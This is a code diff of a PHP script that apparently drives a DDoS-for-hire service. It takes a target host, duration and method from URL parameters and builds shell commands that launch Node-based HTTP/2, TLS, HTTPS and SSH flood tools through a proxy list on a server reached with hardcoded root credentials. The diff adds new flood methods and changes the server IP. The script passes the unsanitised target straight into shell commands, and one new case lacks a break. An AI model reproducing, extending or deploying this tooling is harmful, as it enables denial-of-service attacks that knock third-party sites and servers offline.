@@ -10,7 +10,7 @@ if(isset($_GET['host'], $_GET['port'], $_GET['time'], $_GET['method'], $_GET['ke
     $key = $_GET['key'];
 
     $username = 'root';
-    $ip = '157.230.46.128';
+    $ip = '157.245.62.16';
     $ports = '22';
     $password = 'leo@123';
 
@@ -21,6 +21,11 @@ if(isset($_GET['host'], $_GET['port'], $_GET['time'], $_GET['method'], $_GET['ke
     }
 
     switch ($method) {
+        case 'H2FLOOD':
+            $command = "cd /var/www/html/test/ && screen -dm node -r bytenode loki.jsc $host $time 8 2 proxy.txt";
+        case 'TCPSSH':
+            $command = "cd /var/www/html/test/ && screen -dm node tcpssh $host 22 root $time";
+            break;
         case 'HTTPS':
             $command = "cd /var/www/html/test/ && screen -dm node HTTPS $host $time 8 2 proxy.txt";
             break;
@@ -37,7 +42,7 @@ if(isset($_GET['host'], $_GET['port'], $_GET['time'], $_GET['method'], $_GET['ke
             $command = "cd /var/www/html/test/ && screen -dm node TLS $host $time 8 2 proxy.txt";
             break;
         case 'HOLD':
-            $command = "cd /var/www/html/test/ && screen -dm node HOLD $host $time 5 1 proxy.txt";
+            $command = "cd /var/www/html/test/ && pm2 start HOLD.js --name 'hold' -- $host $time 8 2 proxy.txt";
             break;
         case 'BROWSER':
             $command = "cd /var/www/html/test/ && screen -dm node STATIC $host $time";
@@ -55,10 +60,10 @@ if(isset($_GET['host'], $_GET['port'], $_GET['time'], $_GET['method'], $_GET['ke
             $command = "cd /var/www/html/test/ && screen -dm node ninja $host $time";
             break;
         case 'REFRESH':
-            $command = "cd /var/www/html/test/ && pkill screen";
+            $command = "cd /var/www/html/test/ && pm2 delete hold";
             break;
         case 'UPDATE':
-            $command = "cd /var/www/html/test/ && screen -dm node scrape.js && cd /var/www/html/ && apt update -y && apt upgarde -y";
+            $command = "cd /var/www/html/test/ && screen -dm node scrape.js && cd /root/ && apt update -y && apt upgarde -y";
             break;
         default:
             die("Unknown method");
